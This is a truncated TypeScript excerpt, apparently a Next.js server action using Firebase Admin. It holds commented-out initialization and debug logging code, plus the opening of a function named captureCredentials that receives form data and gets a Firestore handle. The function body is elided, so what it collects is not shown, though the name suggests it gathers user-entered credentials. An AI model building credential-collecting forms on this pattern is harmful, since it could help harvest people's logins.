...
//     try {
//         // 1. Try to return an already initialized app (the default app).
//         // If no default app has been initialized, this will throw an error,
//         // which we catch and proceed to initialization.
//         return admin.app();
//     } catch (error: any) {
//         // If we catch an error, it usually means the app hasn't been initialized yet.
//         // We can optionally verify it's the "App not initialized" error,
//         // but proceeding to initialization is the correct step.
//     }
...
// // DEBUGGING: Log to check structure
// console.log('Service Account Type:', typeof serviceAccount);
// console.log('Service Account Project ID:', serviceAccount.project_id);
// // You should see 'object' and your project ID. If you see 'string' or 'undefined', the parsing is wrong.
...
export async function captureCredentials(prevState: any, formData: FormData) {
  ...
  let firestore;
  try {
    //Call the lazy-loaded Firestore instance function
    firestore = getDb(); 
  } catch (e: any) {
    // If getDb() throws (e.g., service account missing), catch it here.
  ...
  try {
    ...
    // Use the variable populated by getDb()
